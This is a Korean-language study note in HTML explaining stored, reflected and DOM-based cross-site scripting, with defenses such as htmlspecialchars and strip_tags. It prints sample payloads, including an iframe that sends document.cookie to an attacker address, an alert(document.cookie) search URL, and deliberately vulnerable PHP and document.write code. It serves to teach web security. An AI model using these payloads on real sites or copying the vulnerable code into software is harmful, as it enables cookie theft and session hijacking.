I"3<h1 id="xsscross-site-script">XSS(Cross Site Script)</h1>

<ul>
  <li>개요
    <ul>
      <li>SQL Injection : 입력값 필터링이 되지 않아 발생</li>
      <li>XSS (Cross Site Script) : 입력값 필터링이 되지 않아 발생</li>
      <li>Form 입력 양식에 악의적인 스크립트를 작성하여 입력 혹은 URL 입력창에 스크립트를 작성하여 입력
        <ul>
          <li>웹서버에 입력</li>
          <li>Javascript, ActiveX, VBscript, Flash파일 (swf) 등 삽입</li>
        </ul>
      </li>
      <li>공격자에게 개인정보, 쿠키정보 등을 전송, 피해자 PC에 악성코드 설치</li>
      <li>다운로드 받은 html 문서 안에 javascript 등의 악성 스크립트가 포함</li>
      <li>브라우저에서 자동 실행됨</li>
      <li>Client 가 희생자가 됨</li>
    </ul>
  </li>
  <li>과정
    <ul>
      <li>공격자가 XSS 를 서버에 삽입 (XSS 취약점이 존재하는 서버)</li>
      <li>희생자(클라이언트)가 서버의 XSS 에 접근</li>
      <li>희생자가 서버의 XSS 스크립트가 포함된 문서를 다운로드</li>
      <li>희생자의 PC에서 스크립트가 실행됨</li>
      <li>악성코드가 설치되거나 정보가 공격자에게 전달됨</li>
    </ul>
  </li>
  <li>방식
    <ul>
      <li>Stored XSS (저장형 XSS)
        <ul>
          <li>개요
            <ul>
              <li>가장 일반적인 형태의 XSS</li>
              <li>공격자가 게시판, 자료실 등에 스크립트를 입력하여 저장 (DB 저장)</li>
              <li>희생자가 게시물을 열람하는 순간 악성 스크립트가 클라이언트에서 실행됨</li>
              <li>서버 취약점 점검이 필요</li>
            </ul>
          </li>
          <li>공격방식
            <ul>
              <li>주로 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 태그를 이용함
                <ul>
                  <li>최근에는 <code class="language-plaintext highlighter-rouge">&lt;iframe&gt;</code> 태그를 사용자제</li>
                  <li><code class="language-plaintext highlighter-rouge">&lt;iframe width=0 height=0 src="javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'"&gt;&lt;/iframe&gt;</code>
                    <ul>
                      <li>공격자의 주소로 cookie 값을 전송
                        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  $content = "&lt;iframe width=0 height=0 src="javascript:document.location.href='http://192.168.10.1/abc/a.php?cookie=document.cookie'"&gt;&lt;/iframe&gt;";
  $query = "insert into $bbs(id, name, subject, content)
  values ('$id', '$name', '$subject', '$content')";
</code></pre></div>                        </div>
                      </li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>대응방법
            <ul>
              <li>XSS 공격은 HTML, 스크립트 태그를 사용</li>
              <li>HTML 특수문자
                <ul>
                  <li>htmlspecialchars() 함수 이용 (PHP)
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">$content = htmlspecialchars($content,ENT_QUOTES);</code>
                        <ul>
                          <li>ENT_QUOTES : <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code> 모두 변환</li>
                          <li>사용하지 않을 경우 : <code class="language-plaintext highlighter-rouge">"</code> 만 변환</li>
                        </ul>
                      </li>
                      <li>함수 사용시 태그 내용이 그대로 출력됨</li>
                      <li>HTML 특수문자를 escape 처리하여 일반문자 (HTML Entity) 로 치환
                        <ul>
                          <li><code class="language-plaintext highlighter-rouge">&lt;</code> : <code class="language-plaintext highlighter-rouge">&amp;lt;</code></li>
                          <li><code class="language-plaintext highlighter-rouge">&gt;</code> : <code class="language-plaintext highlighter-rouge">&amp;gt;</code></li>
                          <li><code class="language-plaintext highlighter-rouge">&amp;</code> : <code class="language-plaintext highlighter-rouge">&amp;amp;</code></li>
                          <li><code class="language-plaintext highlighter-rouge">"</code> : <code class="language-plaintext highlighter-rouge">&amp;quot;</code></li>
                          <li><code class="language-plaintext highlighter-rouge">'</code> : <code class="language-plaintext highlighter-rouge">&amp;#039;</code> : <code class="language-plaintext highlighter-rouge">&amp;#x27;</code> (16진수)</li>
                          <li><code class="language-plaintext highlighter-rouge">(</code> : <code class="language-plaintext highlighter-rouge">&amp;#40;</code> : <code class="language-plaintext highlighter-rouge">&amp;#x28;</code> (16진수)</li>
                          <li><code class="language-plaintext highlighter-rouge">)</code> : <code class="language-plaintext highlighter-rouge">&amp;#41;</code> : <code class="language-plaintext highlighter-rouge">&amp;#x29;</code> (16진수)</li>
                          <li><code class="language-plaintext highlighter-rouge">#</code> : <code class="language-plaintext highlighter-rouge">&amp;#x23;</code> (16진수)</li>
                          <li><code class="language-plaintext highlighter-rouge">/</code> : <code class="language-plaintext highlighter-rouge">&amp;#x2F;</code> (16진수)</li>
                          <li>소스보기 시 일반문자로 보이게 됨 (<code class="language-plaintext highlighter-rouge">&amp;lt;</code> 등)</li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>strip_tags() 이용
                    <ul>
                      <li>스크립트 태그를 제거</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Reflected XSS (반사형 XSS)
        <ul>
          <li>개요
            <ul>
              <li>악성스크립트를 서버 DB에 저장하지 않음</li>
              <li>악성스크립트를 직접 클릭하도록 유도
                <ul>
                  <li>공격자가 악성스크립트 링크를 포함한 메일 전송</li>
                  <li>희생자는 메일 링크 클릭
                    <ul>
                      <li><code class="language-plaintext highlighter-rouge">url.php?q=스크립트</code> : 희생자가 알아볼 수 없도록 처리</li>
                    </ul>
                  </li>
                  <li>희생자가 링크를 클릭하여 웹서버에 요청</li>
                  <li>서버는 스크립트의 내용을 처리하지 않고 그대로 응답 (서버 처리 스크립트 X)
                    <ul>
                      <li>일반적으로 서버에 검색내용을 입력
                        <ul>
                          <li>입력값 예 : <code class="language-plaintext highlighter-rouge">www.test.com/search/?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
                          <li>검색 결과 있는 경우
                            <ul>
                              <li>결과값을 사용자에게 전달</li>
                            </ul>
                          </li>
                          <li>검색 결과 없는 경우
                            <ul>
                              <li>사용자 입력값을 그대로 HTML 에 포함하여 응답</li>
                              <li>요청값을 서버에서 반사시킴</li>
                              <li>응답 예 :
                                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  &lt;h2&gt;&lt;span class=''&gt;Search Result&lt;/span&gt;&lt;br/&gt;
  Search:&lt;script&gt;alert(document.cookie)&lt;/script&gt;
  &lt;/body&gt;"
</code></pre></div>                                </div>
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li>희생자는 공격자에게 자신의 정보 전달
                    <ul>
                      <li>응답페이지가 희생자에게 전달되면서 스크립트 실행</li>
                    </ul>
                  </li>
                </ul>
              </li>
            </ul>
          </li>
          <li>공격방식
            <ul>
              <li>공격자는 XSS 취약점이 있는 사이트를 발견</li>
              <li>중요 정보를 획득할 수 있는 공격용 악성 URL을 생성</li>
              <li>이 URL을 이메일을 이용하여 배포</li>
              <li>희생자가 URL을 클릭시 악성스크립트가 희생자에 반사되어 공격을 당하게 됨</li>
            </ul>
          </li>
          <li>대응방법
            <ul>
              <li>XSS 취약점이 있는 사이트에서 특수문자를 일반문자 (HTML Entity) 로 치환</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>DOM based XSS
        <ul>
          <li>개요
            <ul>
              <li>DOM (Document Object Model) : HTML/XML 문서 (계층구조)
                <ul>
                  <li>W3C 에서 정의</li>
                  <li>HTML/XML 문서의 접근방법을 표준으로 정의하는 모델</li>
                </ul>
              </li>
              <li>HTML
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;html&gt;
          &lt;head&gt;
              &lt;title&gt;&lt;/title&gt;
          &lt;/head&gt;
          &lt;body&gt;
              &lt;h2&gt;&lt;/h2&gt;
          &lt;/body&gt;
      &lt;/html&gt;
</code></pre></div>                </div>
              </li>
              <li>XML
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;book&gt;
          &lt;subject&gt;&lt;/subject&gt;
          &lt;writer&gt;&lt;/writer&gt;
      &lt;/book&gt;
</code></pre></div>                </div>
              </li>
              <li>DOM based XSS
                <ul>
                  <li>Stored XSS, Reflected XSS 와 달리 서버의 응답과 관계없음</li>
                  <li>피해자의 브라우저에서 발생</li>
                  <li>피해자의 브라우저가 DOM 구문분석을 할 때 악성스크립트 실행</li>
                  <li>Javascript 가 DOM 내용을 변화시킴</li>
                </ul>
              </li>
            </ul>
          </li>
          <li>공격방식
            <ul>
              <li>공격자가 희생자에게 메일링크(악성스크립트 포함)가 포함된 메일을 보냄</li>
              <li>희생자가 링크를 클릭하면 웹서버에 요청</li>
              <li>웹서버가 응답 (악성스크립트 미포함)</li>
              <li>희생자의 요청에 포함된 URL 악성스크립트가 그대로 남아있음</li>
              <li>URL 쿼리스트링의 파라미터를 응답페이지에 있는 DOM을 이용해서 동적으로 악성스크립트를 실행
                <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      &lt;HTML&gt;
          &lt;HEAD&gt;&lt;TITLE&gt;Welcome&lt;/TITLE&gt;&lt;/HEAD&gt;
          &lt;script&gt;
              var pos = document.URL.indexOf("name=")+5;
              document.write(document.URL.substring(pos,document.URL.length))
              /*
              http://www.abc.com/page.php?name=kim
              http://www.abc.com/page.php?name=&lt;script&gt;alert()&lt;/script&gt;
              */
          &lt;/script&gt;
          &lt;body&gt;
              안녕하세요
              아래페이지를 참고하세요
              링크페이지 &lt;!-- 악성코드 url --&gt;
          &lt;/body&gt;
      &lt;/HTML&gt;
</code></pre></div>                </div>
                <ul>
                  <li>이메일 링크 등에 악성스크립트를 포함한 url 전송</li>
                  <li>url 클릭 시 document.write 함수가 있는 서버로 연결</li>
                  <li>클라이언트 브라우저에서 DOM 에 악성코드를 추가</li>
                  <li>브라우저에서 악성스크립트 실행</li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>
:ET